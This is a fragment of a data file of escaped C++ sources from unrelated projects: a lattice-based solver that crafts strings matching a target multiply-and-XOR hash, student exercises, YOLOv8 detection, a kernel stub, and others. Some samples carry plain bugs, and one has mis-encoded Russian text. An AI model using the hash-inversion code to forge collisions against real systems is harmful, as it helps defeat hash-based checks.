call_once(flag, [&]() {\n        Z_NR<mpz_t> mpz_exp, mpz_prime, tmp;\n        mpz_ui_pow_ui(mpz_exp.get_data(), 2U, exp);\n        mpz_set_ui(mpz_prime.get_data(), prime);\n\n        auto ret = gcd_extended(mpz_prime, mpz_exp);\n        tmp.mod(std::get<1>(ret), mpz_exp);\n        result = mpz_get_ui(tmp.get_data());\n        if constexpr (exp != 64) {\n            result %= 1ULL << exp;\n        }\n    });\n\n    return result;\n}\n\nvector<string>& product(const string_view& chars, int repeat) {\n    static unordered_map<int, vector<string>> cache;\n    \n    auto it = cache.find(repeat);\n    if (it != cache.end())\n        return it->second;\n    \n    vector<string> result;\n    function<void(int, string)> generate = [&](int depth, string current) {\n        if (depth == 0) {\n            result.push_back(current);\n            return;\n        }\n        \n        for (const char c : chars)\n            generate(depth - 1, current + c);\n    };\n    \n    generate(repeat, \"\");\n    cache[repeat] = result;    \n    return cache[repeat];\n}\n\ninline Z_NR<mpz_t> pow(const Z_NR<mpz_t>& base, unsigned int exponent) {\n    Z_NR<mpz_t> result;\n    mpz_pow_ui(result.get_data(), base.get_data(), exponent);\n    return result;\n}\n\nbool solve(\n    string& result,\n    const uint64_t target,\n    const uint32_t expected_len,\n    const uint32_t brute = 0,\n    const string& prefix = \"\",\n    const string& suffix = \"\"\n) {\n    Z_NR<mpz_t> MOD, p;\n    mpz_ui_pow_ui(MOD.get_data(), 2U, BIT_LEN); // 2 ** BIT_LEN\n    mpz_set_ui(p.get_data(), PRIME);\n\n    // change according to whatever youre working with\n    const string valid_charset = valid_func;\n\n    const uint32_t nn = expected_len - brute - prefix.size() - suffix.size();\n    const uint32_t dim = nn + 2;\n\n    uint64_t P = 1;\n    for (int i = 0; i < nn; ++i)\n        P *= PRIME;\n    \n    if constexpr (BIT_LEN != 64) {\n        P %= 1ULL << BIT_LEN;\n    }\n\n    Z_NR<mpz_t> start;\n    mpz_set_ui(start.get_data(), 1ULL << 12); // 2 ** 12\n\n    ZZ_mat<mpz_t> Q(dim, dim);\n    Q(0, 0) = start;\n    for (int i = 1; i < dim - 1; ++i)\n        Q(i, i) = 1ULL << 4; // 2 ** 4\n    Q(dim - 1, dim - 1) = 1ULL << 10; // 2 ** 10\n\n    // identity matrix but with an extra column on the left and extra row on the bottom\n    ZZ_mat<mpz_t> _M(dim, dim);\n    for (int i = 0; i <= nn; ++i)\n        _M(i, i+1) = 1;\n\n    // fill in extra column on the left\n    // (except second to last val)\n    for (int i = 0; i < nn; ++i)\n        _M(i, 0) = pow(p, nn - i);\n    _M(dim - 1, 0) = MOD;\n\n    uint64_t ntarget = target;\n    for (int i = suffix.size() - 1; i >= 0; --i) {\n        ntarget *= inverse<PRIME, BIT_LEN>();\n        ntarget ^= suffix.at(i);\n    }\n\n    string ret = \"\";\n    if constexpr (BIT_LEN != 64) {\n   ",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Function used to check if the parentheses in the expression are balanced or not\r\nbool balancedParentheses(string expr)\r\n{\r\n    // Stack of characters named p because the expression will contain parentheses\r\n    stack<char> p;\r\n    // for loop used in order to traverse the expression of parentheses\r\n    for (int i = 0; i < expr.length(); i++)\r\n    {\r\n        // If the expression contains open parentheses, meaning '('\r\n        if (expr[i] == '(')\r\n            p.push(expr[i]);\r\n        else\r\n            p.pop();\r\n    }\r\n    // Return empty stack\r\n    return (p.empty());\r\n}\r\n\r\n// main function, which will take the input from the user and display the output\r\n// of whether or not the expression contains balanced parentheses\r\nint main()\r\n{\r\n    string parenthesesExpression;\r\n    // The user inputting the parentheses expression that either does or does not have balanced parentheses.\r\n    cin >> parenthesesExpression;\r\n    if (balancedParentheses(parenthesesExpression))\r\n        // Output that will be displayed if the expression has balanced parentheses.\r\n        cout << \"Balanced\";\r\n    else\r\n        // Output that will be displayed if the expression's parentheses are not balanced.\r\n        cout << \"Not Balanced\";\r\n    return 0;\r\n}\r\n",
    "#include <fstream>\r\n#include <opencv2/core/mat.hpp>\r\n#include <opencv2/opencv.hpp>\r\nusing namespace std;\r\nusing namespace cv;\r\nusing namespace cv::dnn;\r\n/******************************************************************************************************************/\r\nconst float INPUT_WIDTH = 640.0;\r\nconst float INPUT_HEIGHT = 480.0;\r\nconst float SCORE_THRESHOLD = 0.45;\r\nconst float NMS_THRESHOLD = 0.5;\r\nconst float CONFIDENCE_THRESHOLD = 0.25;\r\n\r\n// Text parameters.\r\nconst float FONT_SCALE = 0.7;\r\nconst int FONT_FACE = FONT_HERSHEY_SIMPLEX;\r\nconst int THICKNESS = 1;\r\n\r\n// Colors.\r\n//const std::vector<cv::Scalar> colors = { cv::Scalar(255, 255, 0), cv::Scalar(0, 255, 0), cv::Scalar(0, 255, 255), cv::Scalar(255, 0, 0) };\r\nScalar BLACK = Scalar(0, 0, 0);\r\nScalar BLUE = Scalar(255, 178, 50);\r\nScalar YELLOW = Scalar(0, 255, 255);\r\nScalar RED = Scalar(0, 0, 255);\r\n/******************************************************************************************************************/\r\nvoid draw_label(Mat& input_image, string label, int left, int top)\r\n{\r\n    // Display the label at the top of the bounding box.\r\n    int baseLine;\r\n    Size label_size = getTextSize(label, FONT_FACE, FONT_SCALE, THICKNESS, &baseLine);\r\n    top = max(top, label_size.height);\r\n    // Top left corner.\r\n    Point tlc = Point(left, top);\r\n    // Bottom right corner.\r\n    Point brc = Point(left + label_size.width, top + label_size.height + baseLine);\r\n    // Draw white rectangle.\r\n    rectangle(input_image, tlc, brc, BLACK, FILLED);\r\n    // Put the label on the black rectangle.\r\n    putText(input_image, label, Point(left, top + label_size.height), FONT_FACE, FONT_SCALE, YELLOW, THICKNESS);\r\n}\r\n/******************************************************************************************************************/\r\nstd::vector<std::string> load_class_list()\r\n{\r\n    std::vector<std::string> class_list;\r\n    std::ifstream ifs(\"classes.txt\");\r\n    std::string line;\r\n    while (getline(ifs, line))\r\n    {\r\n        class_list.push_back(line);\r\n    }\r\n    return class_list;\r\n}\r\n/******************************************************************************************************************/\r\nvoid load_net(cv::dnn::Net& net, bool is_cuda)\r\n{\r\n    auto result = cv::dnn::readNet(\"yolov8s.onnx\");\r\n\r\n    if (is_cuda)\r\n    {\r\n        std::cout << \"Running on GPU using CUDA\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\r\n    }\r\n    else\r\n    {\r\n        std::cout << \"Running on CPU\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\r\n    }\r\n    net = result;\r\n}\r\n\r\n/******************************************************************************************************************/\r\nvector<Mat> pre_process(Mat& input_image, Net& net)\r\n{\r\n    //Convert to blob.\r\n    Mat blob;\r\n    blobFromImage(input_image, blob, 1. / 255., Size(INPUT_WIDTH, INPUT_HEIGHT), Scalar(), true, false);\r\n    net.setInput(blob);\r\n    vector<Mat> outputs;\r\n    if (!blob.empty()) \r\n    {\r\n      net.forward(outputs, net.getUnconnectedOutLayersNames());\r\n    }\r\n\r\n    return outputs;\r\n}\r\n/******************************************************************************************************************/\r\nMat post_process(Mat& input_image, vector<Mat>& outputs, const vector<string>& class_name)\r\n{\r\n    // Initialize vectors to hold respective outputs while unwrapping     detections.\r\n    vector<int> class_ids;\r\n    vector<float> confidences;\r\n    vector<Rect> boxes;\r\n\r\n    int rows = outputs[0].size[2];\r\n    int dimensions = outputs[0].size[1];\r\n\r\n    outputs[0] = outputs[0].reshape(1, dimensions);\r\n    cv::transpose(outputs[0], outputs[0]);\r\n\r\n    float* data = (float*)outputs[0].data;\r\n\r\n    // Resizing factor.\r\n    float x_factor = input_image.cols / INPUT_WIDTH;\r\n    float y_factor = input_image.rows / INPUT_HEIGHT;\r\n\r\n    // Iterate through  detections.\r\n    //cout << \"num detections  : \" << rows << \" \" << dimensions << endl;\r\n    for (int i = 0; i < rows; ++i)\r\n    {\r\n        float* classes_scores = data + 4;\r\n\r\n        cv::Mat scores(1, class_name.size(), CV_32FC1, classes_scores);\r\n        cv::Point class_id;\r\n        double maxClassScore;\r\n\r\n        minMaxLoc(scores, 0, &maxClassScore, 0, &class_id);\r\n\r\n        if (maxClassScore > SCORE_THRESHOLD)\r\n        {\r\n            confidences.push_back(maxClassScore);\r\n            class_ids.push_back(class_id.x);\r\n\r\n            float x = data[0];\r\n            float y = data[1];\r\n            float w = data[2];\r\n            float h = data[3];\r\n\r\n            int left = int((x - 0.5 * w) * x_factor);\r\n            int top = int((y - 0.5 * h) * y_factor);\r\n\r\n            int width = int(w * x_factor);\r\n            int height = int(h * y_factor);\r\n\r\n            boxes.push_back(cv::Rect(left, top, width, height));\r\n        }\r\n\r\n        data += dimensions;\r\n    }\r\n    // Perform Non-Max",
    "#include <lib/print.h>\n#include <limine.h>\n#include <memory/pmem.h>\n#include <system/cpu.h>\n\nusing namespace kernel;\n\nnamespace {\n\nvolatile limine_framebuffer_request fb_request = {\n  .id = LIMINE_FRAMEBUFFER_REQUEST,\n  .revision = 1,\n  .response = nullptr,\n};\n\n}\n\nextern void (*__init_array[])();\nextern void (*__init_array_end[])();\n\nextern \"C\" __attribute__((noreturn)) void _start() {\n  // Call all global constructors\n  for (auto* func = __init_array; func < __init_array_end; ++func) {\n    (*func)();\n  }\n\n  // Initialize the framebuffer console\n  auto* fb = fb_request.response->framebuffers[0];\n  init_fb_console(static_cast<uint32_t*>(fb->address), fb->width, fb->height, fb->pitch);\n\n  platform::cpu::init_features();\n  platform::cpu::init_bsp();\n\n  init_phys_allocator();\n\n  // Perform a silly physical memory allocation test\n  const auto phys1 = alloc_page(kPageUsageConventional);\n  const auto phys2 = alloc_page(kPageUsageConventional);\n  const auto phys3 = alloc_page(kPageUsageConventional);\n\n  kprintf(\"phys1: 0x%zx\\n\", phys1);\n  kprintf(\"phys2: 0x%zx\\n\", phys2);\n  kprintf(\"phys3: 0x%zx\\n\", phys3);\n\n  free_page(phys1);\n  free_page(phys2);\n  free_page(phys3);\n\n  kprintf(\"reached end of _start, halting\\n\");\n\n  while (true) {\n    asm volatile(\"hlt\");\n  }\n}\n",
    "\n#define _USE_MATH_DEFINES\n#include <math.h>\n#include \"string.h\"\n#include \"Planet.h\"\n\nPlanet::Planet()\n{\n\tstrcpy_s(Name, \"\");\n\tstrcpy_s(SymbolName, \"\");\n\tOrbitalRadius = 0;\n\tAngularSpeed = 0;\n\tStartingTheta = 0;\n\tRadiusOnMap = 1;\n\tCurrentTheta = 0;\n\tDiameter = 0;\n}\n\nvoid Planet::Set(char* PlanetName, float PlanetOrbitalRadius, float PlanetPeriodInDays, float PlanetStartingTheta, float PlanetDiameter, int CurrentDay, float RelativeSize, char *PlanetSymbolName)\n{\n\tstrcpy_s(Name, PlanetName);\n\tstrcpy_s(SymbolName, PlanetSymbolName);\n\tOrbitalRadius = PlanetOrbitalRadius;\n\tAngularSpeed = (2 * M_PI) / PlanetPeriodInDays;  //  radians/day\n\tStartingTheta = (PlanetStartingTheta * M_PI) / 180;  //  Convert degrees to radians\n\tRadiusOnMap = 1.0f;\n\tCurrentTheta = 0.0f;\n\tDiameter = PlanetDiameter;\n\n\tSetDayAndSize(CurrentDay, RelativeSize);\n}\n\nvoid Planet::SetDayAndSize(int DayNumber, float RelativeSize)\n{\n\t//  Set theta.\n\t//  theta = starting_theta + (earth_days_passed x (radians/earth_day))\n\tCurrentTheta = StartingTheta + (DayNumber * AngularSpeed);\n\n\t//  Set the real orbital radius on the map.\n\tRadiusOnMap = OrbitalRadius * RelativeSize;\n}\n",
    "//\n//  Embedding.cpp\n//  AIBookEngine\n//\n//  Created by Armando Meabe on 08/05/2024.\n//\n\n#include \"Embedding.hpp\"\n\n// Constructor\nEmbedding::Embedding(const std::vector<float>& embedding) : embedding(embedding) {}\nEmbedding::Embedding(){}\n\n// M\u00e9todo est\u00e1tico para crear una instancia desde un string JSON\nEmbedding Embedding::from_json_string(const std::string& json_string) {\n    auto json = nlohmann::json::parse(json_string);\n    return Embedding(json.at(\"embedding\").get<std::vector<float>>());\n}\n\n// Funci\u00f3n para calcular el producto punto entre dos vectores\nstatic float dot_product(const std::vector<float>& v1, const std::vector<float>& v2) {\n    float sum = 0.0f;\n    for (size_t i = 0; i < v1.size(); ++i) {\n        sum += v1[i] * v2[i];\n    }\n    return sum;\n}\n\n// Funci\u00f3n para calcular la norma de un vector\nstatic float vector_norm(const std::vector<float>& v) {\n    float sum = 0.0f;\n    for (float elem : v) {\n        sum += elem * elem;\n    }\n    return std::sqrt(sum);\n}\n\n// Funci\u00f3n para calcular la distancia coseno entre dos Embeddings\nfloat Embedding::cosine_distance(const Embedding& emb1, const Embedding& emb2) {\n    float dot = dot_product(emb1.embedding, emb2.embedding);\n    float norm1 = vector_norm(emb1.embedding);\n    float norm2 = vector_norm(emb2.embedding);\n    float similarity = dot / (norm1 * norm2);\n    return 1.0f - similarity;\n}\n\nstd::pair<Embedding, Embedding> Embedding::findClosestPair(const std::vector<Embedding>& embeddings1, const std::vector<Embedding>& embeddings2) {\n    std::pair<Embedding, Embedding> closestPair;\n    float minDistance = std::numeric_limits<float>::max();\n\n    for (const Embedding& emb1 : embeddings1) {\n        for (const Embedding& emb2 : embeddings2) {\n            float distance = Embedding::cosine_distance(emb1, emb2);\n            if (distance < minDistance) {\n                minDistance = distance;\n                closestPair = std::pair<Embedding, Embedding>(emb1, emb2);  // Utilizar el constructor de std::pair expl\u00edcitamente\n            }\n        }\n    }\n\n    return closestPair;\n}\n",
    "//PROJECT: Student Record Management System using C++\n//Written by Md Zakaullah\n#include<iostReam>\nusing namespace std;\nstring Roll_no[30],name[30],Class[30],course[30],mobile_no[30],admission_year[30];\nint total=0;\nvoid Enter()\n{\nint ch=0;\ncout<<\"How many students do u want to Enter??\"<<endl;\ncin>>ch;\nif(total==0)\n{\ntotal=ch+total;\nfor(int i=0;i<ch;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO:: \"<<endl;\ncin>>Roll_no[i];\ncout<<\"Enter Name: \"<<endl;\ncin>>name[i];\ncout<<\"Enter Class: \"<<endl;\ncin>>Class[i];\ncout<<\"Enter Course: \"<<endl;\ncin>>course[i];\ncout<<\"Enter Mobile NO: \"<<endl;\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \"<<endl;\ncin>>admission_year[i];\n}\n}\nelse\n{\nfor(int i=total;i<ch+total;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter Course: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\ntotal=ch+total;\n}\n}\nvoid show()\n{\nif(total==0)\n{\ncout<<\"No Data is Entered\"<<endl;\n}\nelse\n{\nfor(int i=0;i<total;i++)\n{\ncout<<\"\\nData of Student \"<<i+1<<endl<<endl;\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\nvoid search()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse\n{\nstring Rollno;\ncout<<\"Enter the Roll no of student\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\n}\nvoid update()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse{\nstring Rollno;\ncout<<\"Enter the Roll no of student which you want to update\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"\\nPrevious data\"<<endl<<endl;\ncout<<\"Data of Student \"<<i+1<<endl;\ncout<<\"Roll NO: \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"Course \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\ncout<<\"\\nEnter new data\"<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter CouRse: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\n}\n}\n}\nvoid Delete()\n{\nif(total==0)\n{\ncout<<\"No data is Entered yet\"<<endl;\n}\nelse\n{\nint a;\ncout<<\"Are you Sure to Delete Data?\"<<endl;\ncout<<\"Press 1 to delete all Record\"<<endl;\ncin>>a;\nif(a==1)\n{\ntotal=0;\ncout<<\"All Record is deleted..!!\"<<endl;\n}\nelse\n{\ncout<<\"Please Press 1 to Delete All Record\"<<endl;\n}\n}\n}\nint main() \n{\nint value;\nwhile(true)\n{\ncout<<\"\\nPress 1 to Enter data\"<<endl<<endl;\ncout<<\"PRess 2 to Show data\"<<endl<<endl;\ncout<<\"PRess 3 to Search data\"<<endl<<endl;\ncout<<\"Press 4 to Update data\"<<endl<<endl;\ncout<<\"Press 5 to Delete data\"<<endl<<endl;\ncout<<\"Press 6 to Quit\"<<endl<<endl;\ncin>>value;\nswitch(value)\n{\ncase 1:\nEnter();\nbreak;\ncase 2:\nshow();\nbreak;\ncase 3:\nsearch();\nbreak;\ncase 4:\nupdate();\nbreak;\ncase 5:\nDelete();\nbreak;\ncase 6:\nexit(0);\nbreak;\ndefault:\ncout<<\"Invalid input\"<<endl;\nbreak;\n}\n}\n}",
    "#include <iostream>\r\n#include <ctime>\r\n#include <time.h>\r\n#include <random>\r\nusing namespace std;\r\n\r\n#define minNumberRange 1\r\n#define maxNumberRange 100000000000\r\n\r\nint linearSearch(int* arr, int size,int num)\r\n{\r\n\tfor (int index = 0; index < size; index++)\r\n\t{\r\n\t\tif (arr[index] == num)\r\n\t\t\treturn index;\r\n\t}\r\n\treturn -1;\r\n}\r\nint main()\r\n{\r\n\tconst int size = 1000000;\r\n\tint* arr = new int[size];\r\n\tsrand(unsigned int(time(NULL)));\r\n\tfor (int i = 0; i < size; i++)\r\n\t{\r\n\t\tarr[i] = minNumberRange + rand() % (maxNumberRange - minNumberRange + 1);\r\n\t\t//cout << arr[i] << \" \";\r\n\t}\r\n\t//cout << endl << endl << endl;\r\n\tint num = minNumberRange + rand() % (maxNumberRange - minNumberRange + 1);\r\n\tclock_t start = clock();\r\n\tint index = linearSearch(arr, size, num);\r\n\t\r\n\tclock_t end = clock();\r\n\r\n\tdouble executionTime = double(end - start) / CLOCKS_PER_SEC * 1000;\r\n\tif (index == -1)\r\n\t\tcout << \"The number \" << num << \"doesn't exist.\" << endl;\r\n\telse\r\n\t\tcout << \"The number \" << num << \" is at index \" << index << endl;\r\n\r\n\tcout << \"Execution Time is \" << executionTime << endl;\r\n\tdelete[] arr;\r\n\treturn 0;\r\n}",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\n// Define the structure for a node in the BST\r\nstruct Node {\r\n    int data;\r\n    Node* left;\r\n    Node* right;\r\n    \r\n    Node(int value) {\r\n        data = value;\r\n        left = NULL;\r\n        right = NULL;\r\n    }\r\n};\r\n\r\n// Function to insert a value into the BST\r\nNode* insert(Node* root, int value) {\r\n    // If the tree is empty, create a new node and make it the root\r\n    if (root == NULL) {\r\n        return new Node(value);\r\n    }\r\n    \r\n    // If the value is less than the root's data, insert it into the left subtree\r\n    if (value < root->data) {\r\n        root->left = insert(root->left, value);\r\n    }\r\n    // If the value is greater than or equal to the root's data, insert it into the right subtree\r\n    else {\r\n        root->right = insert(root->right, value);\r\n    }\r\n    \r\n    return root;\r\n}\r\n\r\n// Function to find the number of nodes in the longest path from the root\r\nint maxDepth(Node* root) {\r\n    if (root == NULL)\r\n        return 0;\r\n    int leftDepth = maxDepth(root->left);\r\n    int rightDepth = maxDepth(root->right);\r\n    return max(leftDepth, rightDepth) + 1;\r\n}\r\n\r\n// Function to find the minimum data value found in the tree\r\nint findMin(Node* root) {\r\n    if (root == NULL)\r\n        return INT_MAX;\r\n    int leftMin = findMin(root->left);\r\n    int rightMin = findMin(root->right);\r\n    return min(root->data, min(leftMin, rightMin));\r\n}\r\n\r\n// Function to change a tree so that the roles of the left and right pointers are swapped at every node\r\nvoid swapLeftAndRight(Node* root) {\r\n    if (root == NULL)\r\n        return;\r\n    swap(root->left, root->right);\r\n    swapLeftAndRight(root->left);\r\n    swapLeftAndRight(root->right);\r\n}\r\n\r\n// Function to search for a value in the BST\r\nbool search(Node* root, int value) {\r\n    if (root == NULL)\r\n        return false;\r\n    if (root->data == value)\r\n        return true;\r\n    if (value < root->data)\r\n        return search(root->left, value);\r\n    else\r\n        return search(root->right, value);\r\n}\r\n\r\nvoid display(Node *root){\r\n    if(root != NULL){\r\n        queue<Node*> q;\r\n        q.push(root);\r\n        while (!q.empty()) {\r\n            int levelSize = q.size();\r\n            for (int i = 0; i < levelSize; ++i) {\r\n                Node* currentNode = q.front();\r\n                q.pop();\r\n                cout << currentNode->data << \" \";\r\n                if (currentNode->left != NULL)\r\n                    q.push(currentNode->left);\r\n                if (currentNode->right != NULL)\r\n                    q.push(currentNode->right);\r\n            }\r\n            cout << endl;\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    Node* root = NULL;\r\n    int choice;\r\n    int result,result2,result3;\r\n    \r\n    char ch;\r\n    do{\r\n        cout<<\"1. Insert\"<<endl;\r\n        cout<<\"2. number of nodes in the longest path from the root\"<<endl;\r\n        cout<<\"3. minimum data value found in the tree\"<<endl;\r\n        cout<<\"4. change a tree so that the roles of the left and right pointers are swapped at every node\"<<endl;\r\n        cout<<\"5. search\"<<endl;\r\n        cout<<\"6. Display(BFS)\"<<endl;\r\n        cout<<\"Enter choice :\";\r\n\r\n        cin>>choice;\r\n        switch(choice){\r\n            case 1:\r\n                int n;\r\n                cout<<\"How many nodes you want to insert ? :\";\r\n                cin>>n;\r\n                for(int i=0;i<n;i++){\r\n                    int value;\r\n                    cout<<\"Enter value to insert :\";\r\n                    cin>>value;\r\n                    root=insert(root,value);\r\n                }\r\n                break;\r\n            case 2:\r\n                result=maxDepth(root);\r\n                cout<<\"No. of nodes in the longest path from the root are \"<<result<<endl;\r\n                break;\r\n            case 3:\r\n                result2=findMin(root);\r\n                cout<<\"minimum value found in the tree is \"<<result2<<endl;\r\n                break;\r\n            case 4:\r\n                swapLeftAndRight(root);\r\n                break;\r\n            case 5:\r\n                int key;\r\n                cout<<\"Enter value to be search :\";\r\n                cin>>key;\r\n                result3=search(root,key);\r\n                if(result3==0) cout<<\"Value Not Found !\"<<endl;\r\n                else cout<<\"Value Found !\"<<endl;\r\n                break;\r\n            case 6:\r\n                display(root);\r\n                break;\r\n            default:\r\n                cout<<\"invalid Input \"<<endl;\r\n                break;\r\n        }\r\n        cout<<\"Do you want to continue (y/n)? :\";\r\n        cin>>ch;\r\n    }while(ch=='y');\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <regex>\n#include <iostream>\n#include \"constants.h\"\n\n#include \"utils.h\"\n#include <fstream>\n\nusing namespace std;\n\nint task() {\n\tregex valid_input(\"^[01]$\");\n\t\n\tstring input;\n\tchar in_option, out_option;\n\tint matrix_n, matrix_m;\n\n\tdo {\n\t\tdo {\n\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 '0' \u00e4\u00eb\u00ff \u00e2\u00e2\u00ee\u00e4\u00e0 \u00f1 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8, '1' \u00e4\u00eb\u00ff \u00e2\u00e2\u00ee\u00e4\u00e0 \u00e8\u00e7 \u00f4\u00e0\u00e9\u00eb\u00e0: \";\n\t\t\tgetline(cin, input);\n\t\t} while (!regex_match(input, valid_input));\n\t\tin_option = input[0];\n\n\t\tdo {\n\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 '0' \u00e4\u00eb\u00ff \u00e2\u00fb\u00e2\u00ee\u00e4\u00e0 \u00ed\u00e0 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc, '1' \u00e4\u00eb\u00ff \u00e2\u00fb\u00e2\u00ee\u00e4\u00e0 \u00e2 \u00f4\u00e0\u00e9\u00eb: \";\n\t\t\tgetline(cin, input);\n\t\t} while (!regex_match(input, valid_input));\n\t\tout_option = input[0];\n\n\t\tif (in_option == '0') {\n\t\t\treadFromConsole(matrix_n, matrix_m);\n\t\t}\n\t\telse if (in_option == '1') {\n\t\t\tif (!readFromFile(constants::input, matrix_n, matrix_m)) {\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\n\t\tdouble** matrix = new double* [matrix_n];\n\t\tfor (int i{ 0 }; i < matrix_n; i++) {\n\t\t\tmatrix[i] = new double[matrix_m];\n\t\t}\n\t\t\n\t\tfor (int i{ 0 }; i < matrix_m; i++){\n\t\t\tmatrix[0][i] = 2 * (i + 1) + 3;\n\t\t}\n\t\t\n\t\tif (matrix_n >= 2) {\n\t\t\tfor (int i{ 0 }; i < matrix_m; i++){\n\t\t\t\tmatrix[1][i] = (i + 1) - (3 / (2 + 1. / (i + 1)));\n\t\t\t}\n\t\t}\n\n\t\tfor (int i{2}; i < matrix_n; i++) {\n\t\t\tfor (int j{ 0 }; j < matrix_m; j++) {\n\t\t\t\tmatrix[i][j] = matrix[i - 1][j] + matrix[i - 2][j];\n\t\t\t}\n\t\t}\n\n\t\tif (out_option == '0') {\n\t\t\tprintConsole(matrix, matrix_n, matrix_m);\n\t\t}\n\t\telse if (out_option == '1'){\n\t\t\twriteToFile(constants::output, matrix, matrix_n, matrix_m);\n\t\t}\n\n\t\tfreeMatrix(matrix, matrix_n);\n\t\tif (in_option == '0') {\n\t\t\tdo {\n\t\t\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 '0' \u00e4\u00eb\u00ff \u00ef\u00ee\u00e2\u00f2\u00ee\u00f0\u00e0 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb, '1' \u00e4\u00eb\u00ff \u00e7\u00e0\u00e2\u00e5\u00f0\u00f8\u00e5\u00ed\u00e8\u00ff \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb: \";\n\t\t\t\tgetline(cin, input);\n\t\t\t} while (!regex_match(input, valid_input));\n\t\t\tin_option = input[0];\n\t\t}\n\t} while (in_option != '1');\n\treturn 0;\n}\n\nvoid readFromConsole(int& matrix_n, int& matrix_m) {\n\tregex valid_number(\"[1-9][0-9]*\");\n\tstring input;\n\n\tdo {\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00ee \u00f1\u00f2\u00f0\u00ee\u00ea (n): \";\n\t\tgetline(cin, input);\n\t} while (!regex_match(input, valid_number));\n\n\tmatrix_n = stoi(input);\n\n\tdo {\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00ee \u00f1\u00f2\u00ee\u00eb\u00e1\u00f6\u00ee\u00e2 (m): \";\n\t\tgetline(cin, input);\n\t} while (!regex_match(input, valid_number));\n\tmatrix_m = stoi(input);\n}\n\nbool readFromFile(const char* input,  int& matrix_n, int& matrix_m) {\n\tifstream file(input);\n\n\tif (!file.is_open()) {\n\t\tcerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00ef\u00f0\u00e8 \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00e8\u00e8 \u00f4\u00e0\u00e9\u00eb\u00e0 \u00f1 \u00e2\u00f5\u00ee\u00e4\u00ed\u00fb\u00ec\u00ec\u00e8 \u00e4\u00e0\u00ed\u00ed\u00fb\u00ec\u00e8\" << endl;\n\t\treturn false;\n\t}\n\tif (!(file >> matrix_n >> matrix_m)) {\n\t\tcerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00f7\u00f2\u00e5\u00ed\u00e8\u00ff \u00f4\u00e0\u00e9\u00eb\u00e0 \u00f1 \u00e2\u00f5\u00ee\u00e4\u00ed\u00fb\u00ec\u00ec\u00e8 \u00e4\u00e0\u00ed\u00ed\u00fb\u00ec\u00e8\" << std::endl;\n\t\tfile.close();\n\t\treturn false;\n\t}\n\tchar e;\n\tif (file >> e) {\n\t\tcerr << \"\u00cd\u00e5\u00e2\u00e5\u00f0\u00ed\u00fb\u00e5 \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00e2 \u00f4\u00e0\u00e9\u00eb\u00e5\" << std::endl;\n\t\tfile.close();\n\t\treturn 